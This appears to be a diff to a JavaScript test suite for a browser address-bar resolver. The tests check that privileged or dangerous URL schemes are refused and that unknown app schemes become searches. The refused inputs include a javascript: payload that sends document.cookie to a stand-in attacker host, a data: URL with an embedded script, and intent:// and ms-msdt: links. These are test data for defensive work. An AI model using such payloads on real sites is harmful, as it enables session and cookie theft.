@@ -33,7 +33,6 @@ test('anything else becomes a search', () => {
 });
 
 test('privileged schemes are refused outright, not searched for', () => {
-  // Searching for them would leak the pasted text to the search engine.
   for (const attempt of [
     'chrome://net-export',
     'devtools://devtools/bundled/inspector.html',
@@ -41,9 +40,19 @@ test('privileged schemes are refused outright, not searched for', () => {
     'javascript:fetch("https://evil.test/"+document.cookie)',
     'vbscript:msgbox(1)',
     'chrome-untrusted://x',
+    'data:text/html,<script>alert(1)</script>',
+    'intent://scan/#Intent;scheme=zxing;end',
+    'ms-msdt:something',
   ]) {
     assert.equal(resolve(attempt), null, attempt);
   }
+});
+
+test('unknown app schemes are searched, not handed to the OS', () => {
+  assert.equal(
+    resolve('slack://open'),
+    'https://duckduckgo.com/?q=slack%3A%2F%2Fopen'
+  );
 });
 
 test('empty input resolves to nothing', () => {
